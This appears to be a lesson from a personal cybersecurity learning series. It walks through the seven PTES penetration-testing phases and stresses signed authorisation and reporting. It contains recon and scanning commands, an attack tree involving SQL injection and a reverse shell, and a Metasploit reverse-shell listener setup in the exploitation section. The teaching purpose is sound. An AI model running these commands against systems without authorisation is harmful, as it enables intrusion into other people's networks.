# Day 021 - Penetration Testing Methodology: How Professional Hackers Actually Work

> **Challenge:** 100 Days of Cybersecurity | **Phase:** Offensive Security | **Difficulty:** Intermediate

---

## 🧠 The Concept

Hacking without methodology is just noise.

Professional penetration testers don't randomly try exploits and hope something works. They follow a structured process - the same one, every engagement - because consistency is what makes results repeatable, reportable, and useful to the client.

Phase 2 of this challenge follows this methodology. Every day fits into one of these phases.

---

## 📋 The Penetration Testing Execution Standard (PTES)

The most widely used pen test framework. Seven phases:

```
1. Pre-Engagement
2. Intelligence Gathering (Recon)
3. Threat Modelling
4. Vulnerability Analysis
5. Exploitation
6. Post-Exploitation
7. Reporting
```

---

## Phase 1 - Pre-Engagement

Before touching anything, define the rules.

**Scope:** What's in? What's out?
```
In scope:  192.168.1.0/24, *.targetcompany.com
Out of scope: mail.targetcompany.com, third-party systems
```

**Rules of Engagement (RoE):**
- Testing hours (can I test at 2am?)
- What actions are allowed? (Can I run DoS tests?)
- Emergency contacts (if I accidentally take something down)
- How do I handle discovered sensitive data?

**Legal authorisation:** A signed Statement of Work or penetration testing agreement. Without this - it's not a pen test. It's a crime.

No exceptions. No "I was just looking."

---

## Phase 2 - Intelligence Gathering (Recon)

Collect as much information as possible about the target without triggering alarms.

### Passive Recon (no direct contact with target)
```bash
# WHOIS - who owns the domain?
whois targetcompany.com

# DNS records
dig targetcompany.com ANY

# Subdomain enumeration (Day 4/43)
# Google dorking
site:targetcompany.com filetype:pdf
site:targetcompany.com inurl:admin

# Shodan - internet-exposed devices
https://www.shodan.io/search?query=targetcompany.com

# LinkedIn - employee names, tech stack clues
# GitHub - leaked credentials, internal code
# Job postings - "experience with AWS, Kubernetes, Jenkins" = their stack
```

### Active Recon (direct contact with target)
```bash
# Port scanning (Day 13)
nmap -sV -sC target.com

# Subdomain brute force (Day 4)
python3 dns_enum.py targetcompany.com

# Web directory enumeration
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt
```

---

## Phase 3 - Threat Modelling

Look at what you found and ask: what's worth attacking?

Prioritise based on:
- Impact if exploited (critical server vs dev machine)
- Likelihood of success (known CVE with public exploit > hardened system)
- Attack surface (internet-facing > internal)

Build an attack tree:
```
Goal: Gain admin access to customer database

├── Path A: Web app SQLi on login form
│   ├── Test for SQLi → extract credentials → login as admin
│
├── Path B: Exploit outdated Apache (CVE-2017-xxxx)
│   ├── RCE → reverse shell → escalate → database access
│
└── Path C: Phish an employee
    ├── Get VPN credentials → internal access → database
```

---

## Phase 4 - Vulnerability Analysis

Systematically find weaknesses in the target.

```bash
# Automated scanning
nikto -h https://target.com              # web server vulnerabilities
nmap --script vuln target.com            # NSE vulnerability scripts

# Manual testing
# Check service versions against CVE databases (Day 18)
# Test authentication (Day 11)
# Check for default credentials
# Review web app for OWASP Top 10 (Day 17)

# Searchsploit - find exploits for discovered services
searchsploit apache 2.4.18
searchsploit openssh 7.2
```

---

## Phase 5 - Exploitation

Execute the attack. Get access.

**Rules:**
- Only exploit what's in scope
- Document every step - timestamps, commands, outputs
- Don't destroy evidence or modify data unnecessarily
- Stop and call the client if you find something catastrophic unexpectedly

```bash
# Example: Metasploit exploitation
msfconsole
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST <your-ip>
set LPORT 4444
run
```

---

## Phase 6 - Post-Exploitation

You have access. Now prove the impact.

```
Objectives:
→ Privilege escalation (low-priv shell → root/admin)
→ Lateral movement (pivot to other machines)
→ Persistence (can you maintain access if the shell dies?)
→ Data exfiltration (what sensitive data is accessible?)
→ Evidence collection (screenshots, file listings)
```

Document everything you find. The client needs to understand the real-world impact - not just "I got in."

---

## Phase 7 - Reporting

The most important deliverable. Everything else is worthless without this.

A professional pen test report contains:

```
1. Executive Summary (non-technical)
   → What was tested, what was found, what's the risk

2. Scope and Methodology
   → What was in scope, what approach was used

3. Findings (for each vulnerability):
   → Title
   → Severity (Critical/High/Medium/Low)
   → Description
   → Evidence (screenshots, output)
   → Impact (what could an attacker do?)
   → Recommendation (how to fix it)

4. Risk Summary
   → Prioritised list of what to fix first

5. Appendices
   → Raw tool output, timeline, methodology detail
```

We build this template at Day 40.

---

## 🔑 The Penetration Tester's Mindset

Three things that separate methodical from random:

**1. Document everything**
If you didn't document it - it didn't happen. Screenshots, timestamps, command output. All of it.

**2. Don't skip phases**
Skipping recon to get to exploitation is how you miss the easiest path. The longest route is usually through insufficient enumeration.

**3. Think like the defender**
What would trigger an alert? What would a SOC analyst see? This makes you a better tester - and helps you understand Phase 3 (defensive security) when we get there.

---

## 🔑 Key Takeaways

- Pen testing without methodology = noise. With methodology = results.
- Pre-engagement authorisation is non-negotiable - without it, it's illegal
- Recon is the most underrated phase - most of the attack surface is found here
- Post-exploitation is where you prove business impact, not just technical access
- The report is the product - it's what the client pays for

---

## 📚 Resources to Go Deeper
- [PTES - Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [TCM Security - Practical Ethical Hacking course](https://academy.tcm-sec.com/)

---

## [⬅️ Day 020](../day020/) | [➡️ Day 022](../day022/)

*Part of my [100 Days of Cybersecurity](../README.md) challenge.*